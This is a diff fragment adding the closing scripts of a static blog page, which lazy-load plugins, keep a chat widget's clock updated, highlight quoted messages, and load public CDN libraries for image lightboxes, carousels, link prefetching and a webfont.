+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.7.0/style.min.css" media="all">
+
+
+
+<!-- inject -->
+
+</div></body></html>
